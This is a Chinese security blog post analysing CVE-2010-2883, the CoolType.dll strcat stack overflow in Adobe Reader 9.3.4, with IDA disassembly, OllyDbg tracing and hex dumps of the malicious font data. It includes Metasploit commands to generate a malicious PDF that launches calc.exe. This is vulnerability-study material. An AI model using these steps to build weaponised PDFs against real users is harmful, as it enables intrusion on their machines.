<!DOCTYPE html>
<html>


    <head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>漏洞战争-cve-2010-2883</title>
<meta name="description" content="A blog about programming and network security">

<link rel="profile" href="https://gmpg.org/xfn/11" />
<! -- link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bbbbootstrap.min.css"-- >
<link rel="stylesheet" href="/css/my_code.css">
<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
<link rel="stylesheet" href="/css/highlightjs.piperita.css">

<!-- Favicons generated at https://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
<link rel="manifest" href="/favicons/manifest.json">
<link rel="shortcut icon" href="/favicons/favicon.ico">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
<meta name="msapplication-config" content="/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">





</head>


    <body>

    <nav id="my-menu">
  <div>
    <p>quanyechavshuo</p>

    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <!--https://fontawesome.io/icons/ -->
    <br>
    <center>
    <font color="red" align="center"><i class="fa fa-link" aria-hidden="true"></i><a href="../../../../../bookmarks.html"><font color="red"> link</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-key" aria-hidden="true"></i><a href="../../../../../book.html" target="_top"><font color="red"> book</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-caret-square-o-right" aria-hidden="true"></i><a href="../../../../../mv.html" target="_top"><font color="red"> movie</font></a></font>
    </center>
    <p class="links">
  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
</p>

  </div>
</nav>
<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>



    <div class="page-content">
      <div class="wrap">
      

<div class="container-fluid single">
  <div class="row">

    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
      

      <h1 class="header" itemprop="name">漏洞战争-cve-2010-2883</h1>

      <div class="author">
        <small><i>
          
          on <span itemprop="datePublished" content="2014-08-28">July 28, 2016</span>
           under 二进制
        </i></small>
      </div>

      <div class="read-time">
        <small>
          7 minute read
        </small>
      </div>

      <div class="content-panel content">

        

        <span itemprop="articleBody"><p>0x00 漏洞情况</p>

<div class="highlighter-rouge"><pre class="highlight"><code>漏洞出现在cooltype.dll文件中,由strcat调用产生栈溢出漏洞

strcat:

原型
extern char *strcat(char *dest,char *src);

用法
#include &lt;string.h&gt;
在C++中,则存在于&lt;cstring&gt;头文件中.

功能
把src所指字符串添加到dest结尾处(覆盖dest结尾处的'\0').

说明
src和dest所指内存区域不可以重叠且dest必须有足够的空间来容纳src的字符串.
返回指向dest的指针.

准备工作:
1.下载adobe reader 9.3.4
    神器站点:
    https://www.oldapps.com/index.php
2.制作恶意pdf:
    https://www.freebuf.com/vuls/80072.html
msfconsole
    search cve-2010-2883
    use exploit/windows/fileformat/adobe_cooltype_sing
    set payload windows/exec
    set cmd calc.exe
    exploit
3.实验系统：
    windwos 2003 R2 sp2 32位
</code></pre>
</div>

<p>0x01 ida对应代码</p>

<div class="highlighter-rouge"><pre class="highlight"><code>1.安装adobe reader9.3.4后,将cooltype.dll用ida打开

2.搜索方法:
ctrl+s
双击.text段
alt+t搜索所有"SING"
在9个结果中一一打开
发现第二个搜索结果为书中的关键有溢出代码处

3.具体如下:
------------------key code------------------
.text:0803DBF2                 push    ebp
.text:0803DBF3                 sub     esp, 104h
.text:0803DBF9                 lea     ebp, [esp-4]
.text:0803DBFD                 mov     eax, ___security_cookie
.text:0803DC02                 xor     eax, ebp
.text:0803DC04                 mov     [ebp+108h+var_4], eax
.text:0803DC0A                 push    4Ch
.text:0803DC0C                 mov     eax, offset sub_81847C4
.text:0803DC11                 call    __EH_prolog3_catch
.text:0803DC16                 mov     eax, [ebp+108h+arg_C]
.text:0803DC1C                 mov     edi, [ebp+108h+arg_0]
.text:0803DC22                 mov     ebx, [ebp+108h+arg_4]
.text:0803DC28                 mov     [ebp+108h+var_130], edi
.text:0803DC2B                 mov     [ebp+108h+var_138], eax
.text:0803DC2E                 call    sub_8041626
.text:0803DC33                 xor     esi, esi
.text:0803DC35                 cmp     dword ptr [edi+8], 3
.text:0803DC39                 mov     [ebp+108h+var_10C], esi
.text:0803DC3C                 jz      loc_803DDF9
.text:0803DC42                 mov     [ebp+108h+var_124], esi
.text:0803DC45                 mov     [ebp+108h+var_120], esi
.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1
.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1
.text:0803DC50                 jnz     loc_803DDA2
.text:0803DC56                 push    offset aName    ; "name"
.text:0803DC5B                 push    edi             ; int
.text:0803DC5C                 lea     ecx, [ebp+108h+var_124]
.text:0803DC5F                 mov     [ebp+108h+var_119], 0
.text:0803DC63                 call    sub_802178F
.text:0803DC68                 cmp     [ebp+108h+var_124], esi
.text:0803DC6B                 jnz     short loc_803DCD6
.text:0803DC6D                 push    offset aSing    ; "SING"
.text:0803DC72                 push    edi             ; int
.text:0803DC73                 lea     ecx, [ebp+108h+var_12C]
.text:0803DC76                 call    sub_8021ABE
.text:0803DC7B                 mov     eax, [ebp+108h+var_12C]
.text:0803DC7E                 cmp     eax, esi
.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2
.text:0803DC84                 jz      short loc_803DCBD
.text:0803DC86                 mov     ecx, [eax]
.text:0803DC88                 and     ecx, 0FFFFh
.text:0803DC8E                 jz      short loc_803DC98
.text:0803DC90                 cmp     ecx, 100h
.text:0803DC96                 jnz     short loc_803DCB9
.text:0803DC98
.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9Cj
.text:0803DC98                 add     eax, 10h
.text:0803DC9B                 push    eax             ; char *
.text:0803DC9C                 lea     eax, [ebp+108h+var_108]
.text:0803DC9F                 push    eax             ; char *
.text:0803DCA0                 mov     [ebp+108h+var_108], 0
.text:0803DCA4                 call    strcat
.text:0803DCA9                 pop     ecx
.text:0803DCAA                 pop     ecx
.text:0803DCAB                 lea     eax, [ebp+108h+var_108]
.text:0803DCAE                 push    eax
.text:0803DCAF                 mov     ecx, ebx
.text:0803DCB1                 call    sub_8001243
.text:0803DCB6                 mov     eax, [ebp+108h+var_12C]
--------------end------------------------

4.分析
a.803dca4处的call strcat的两个参数为803dc9b处的eax和803dc9f处的eax
b.在803dc9b处下断调试容易跟踪详情
</code></pre>
</div>

<p>0x02 od动态跟踪</p>

<div class="highlighter-rouge"><pre class="highlight"><code>1.打开reader,od附加,f9
2.ctrl+g:803dc9b,f2
3.reader中打开msf.pdf
4.od中断到803dc9b处,eax=3a0481c,对应eax中内容如下:
------------source------------
C1 23 FF 72 29 25 28 FA 14 A7 82 4A 0C 0C 0C 0C 1A 49 4D 57 BA 5E 73 48 4C 17 A1 86 CC 31 4A 54
8A 21 53 5A D0 1E 19 C5 14 E2 3F 09 B5 0B 22 8A 04 DD AA 0D 70 22 95 B7 3D 4F 7C B6 BF FB D3 88
ED D0 8B 34 71 AD 87 22 9A B5 7E 26 17 8F B0 0A CA F5 B3 ED 30 AC B8 98 F8 4A 56 98 42 87 9D 4A
AB E5 BF 42 08 59 D0 79 1A 7A 7B 6C B7 C7 6D A7 98 66 B2 43 0C A1 7D 34 27 59 BC D2 E6 5B A1 09
2C 94 DA 54 C3 51 54 CC C1 1B E7 0A 5D ED 16 8E 15 0B 57 30 5A 22 6E D4 73 1D C3 C5 7F 5D F7 6C
8C 86 FE 39 88 59 1C 66 A6 D3 20 57 04 CE 8C 58 D6 24 BB 75 05 BE 32 EE E3 31 23 FC 3B EA DC C1
31 60 F7 89 33 A7 EF 7E BD 48 57 EB 7B DB 64 BD 91 D6 C3 D4 74 CA ED 29 4B 1C AE DA EB 81 01 4A
BB 21 7F 1D A9 68 6A C7 87 7C 74 3B 27 8F 73 81 42 5F 84 AE 6A 88 92 40 F7 33 B1 FC 46 17 A7 86
88 FE 04 BC 2D 05 87 A9 89 A3 DD A3 60 E6 7B 49 96 6E EA 95 EE 0C 0B 15 5D 56 0E 8B 55 8C 80 C3
48 B6 B3 8E 1E 80 8A BC 09 71 E4 11 09 97 23 EE C6 08 8A 4A 24 13 A8 4D E5 05 43 96 AC BA 8D FC
AF 55 9F 3C 3A 84 7E 7B 93 DB 75 2B E3 C7 BF 22 44 2E 46 01 40 8E EA 48 49 F6 C6 ED 0C F4 82 7D
29 6C B6 DC 7E 73 14 93 F3 71 91 71 C7 B8 FE 0A F3 AF EF 38 B1 EC B5 4C F7 79 DF 50 92 EF D3 D8
8E BB 68 A1 07 3B CC 97 5D 2A 0D CF 82 AB AC 62 7A 7F 15 E9 DE 2E F4 E6 6B 5F 86 F2 F5 E2 8F 26
B1 BE 30 EC 1F AE B5 7F 6B 83 BD 67 B9 6B 74 02 34 70 BC C4 CB CF DA 27 C2 3D F7 C1 99 14 49 15
AC C3 CE 15 DF 97 9D 41 B5 A5 6E C9 7C B6 3E F0 97 6C 12 ED D1 B7 07 24 11 11 EB 83 E5 89 E4 B5
57 0F 68 52 46 41 5D BB 5A EF 11 07 16 2B D6 C3 0E 96 0C DD F3 38 33 4F 38 CB 80 4A D7 41 7D 87
3B CA 10 96 BF D5 70 4C 63 B6 A7 C9 CE 0F 61 0B 6C CB 52 EF 11 0C 51 7A E7 2F 39 22 0D 28 6A 89
87 C4 C3 56 AC 9D 48 DC C8 60 B1 8F 02 6D 49 6B 90 85 E0 C5 FD 5F D1 AA 30 ED FD C2 6C 00 00 00
-------------end--------------

共18*32-3=573个字节

5.f8,f8,f8到803dca0处时eax=12e4b0,也即strcat的目标地址(第一个参数)
(12e4b0在堆栈窗口中跟随)
------------12e4b0-------------
0012E4B0   0012E400
0012E4B4   0012E688
0012E4B8   00000000
0012E4BC   91E717D0
0012E4C0   0012E830
0012E4C4   0823AE9C  CoolType.0823AE9C
0012E4C8   080852EF  返回到 CoolType.080852EF 来自 CoolType.0804818F
0012E4CC   0823A650  CoolType.0823A650
0012E4D0   044498BC
0012E4D4   08080D0B  CoolType.08080D0B
0012E4D8   046B1C1C
0012E4DC   0012E4AC
0012E4E0   0012E528
0012E4E4   0136F8AF  AcroRd_1.0136F8AF
0012E4E8   FFFFFFFF
0012E4EC   010CB9DC  返回到 AcroRd_1.010CB9DC 来自 AcroRd_1.00BB1899
0012E4F0   011BA90A  返回到 AcroRd_1.011BA90A
0012E4F4   0012E55C
0012E4F8   0012E56C
0012E4FC   0012E558
0012E500  /0012E554
0012E504  |011BA949  返回到 AcroRd_1.011BA949 来自 AcroRd_1.00BB1899
0012E508  |91E71706
0012E50C  |00000004
0012E510  |0012E688
0012E514  |00000000
0012E518  |0012E518
0012E51C  |011BA90A  返回到 AcroRd_1.011BA90A
0012E520  |0012E588
0012E524  |0012E598

-------------end---------------

111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
f8执行到803dca4处,此时下一句为strcat,803dca0处的mov byte ptr ss:[ebp],0x0,
ss:[ebp]在od中看到是eax的大小（0x12e4b0）,这句mov指令将12e4b0内存地址对应的数据内容中的数据的第一个字节置0,
这样strcat(argv1=0x12e4b0,argv2=0x3a0481c)的第一个参数对应内存数据的最低一个字节的内容变为0,
于是strcat将从12e4b0处开始拼接第二个参数对应的内存数据,而12e4b0在堆栈窗口中的情况如上所示,
(12e4b0在数据窗口中跟随)
--------------start--------------
00 E4 12 00 88 E6 12 00 00 00 00 00 9E 4F 26 04 30 E8 12 00 9C AE 23 08 A9 51 08 08 50 A6 23 08
4C 97 B8 03 D1 0B 08 08 A4 5A 9F 03 AC E4 12 00 28 E5 12 00 76 BE 36 01 FF FF FF FF 87 85 0C 01
DA 75 1B 01 5C E5 12 00 6C E5 12 00 58 E5 12 00 54 E5 12 00 19 76 1B 01 78 4C 26 04 04 00 00 00
88 E6 12 00 00 00 00 00 18 E5 12 00 DA 75 1B 01 88 E5 12 00 98 E5 12 00 AC E5 12 00 E2 8D 36 01
FF FF FF FF 19 76 1B 01 88 E6 12 00 00 02 00 00 78 E5 12 00 6E 30 08 08 B4 E6 12 00 AC 5A 9F 03
04 00 00 00 04 00 00 00 35 83 04 08 0A 4F 26 04 04 00 00 00 E0 E5 12 00 00 00 00 00 01 00 00 00
04 00 00 00 5C E5 12 00 A8 E5 12 00 BC E5 12 00 6D 1C 17 08 66 33 15 0C FE FF FF FF 35 83 04 08
3F 73 01 08 60 E6 12 00 08 00 00 00 04 00 00 00 57 10 00 08 84 73 01 08 4E 4F 26 04 04 00 00 00
A8 E6 12 00 36 4E 26 04 F0 E6 12 00 87 D0 0D 08 F0 E6 12 00 E0 E5 12 00 00 00 00 00 D8 E6 12 00
76 4C 26 04 30 E8 12 00 9C AE 23 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
--------------end----------------
6.0x12e4b0+0x23c=0x12e6ec
易知12e4c8处首先被覆盖成03a9dc3f(4中第七个栈单元的内容)
</code></pre>
</div>
</span>

        


        
        <div class="tags">
          <small>
          <i class="fa fa-tags"></i>
            漏洞战争, 漏洞分析, adobe reader
          </small>
        </div>
        

      </div>

      
      <div class="content-panel feedback">
        I <i class="fa fa-heart"></i> feedback.<br />
        Let me know what you think of this article on twitter <a href="https://www.twitter.com/quanyechavshuo">@quanyechavshuo</a> or leave a comment below!
      </div>
      

      
      <div class="content-panel comments">
        <div id="disqus_thread">
          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
          <a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
        </div>
      </div>
      

      

    </div>

  </div>

</div>


<script type="text/javascript">
/* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
function disqus_config() { this.experiment.enable_scroll_container = true; }
var disqus_shortname = "quanyechavshuo"; // required: replace example with your forum shortname
/* * * DON'T EDIT BELOW THIS LINE * * */
(function() {
  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>


      </div>
    </div>

    <div class="footer clearfix">
  <div class="col-md-12">
    for better experience please install font 文泉驿等宽正黑
  </div>
</div>

<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/3xp10it" target="_top"> <font color="white">papers</font></a></div>
<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
<div class="my-archive"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
<div class="my-categories"><i class="fa fa-tags" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">categories</font></a></div>


<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
<script src="/js/jquery.mmenu.min.all.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<script type="text/javascript">
   $(document).ready(function() {
      $("#my-menu").mmenu().on( "closed.mm", function() {
            $(".menu-button").show();
         });
      $(".menu-button").click(function() {
        $(".menu-button").hide();
        $("#my-menu").trigger("open.mm");
      });
   });
</script>






    </body>
</html>
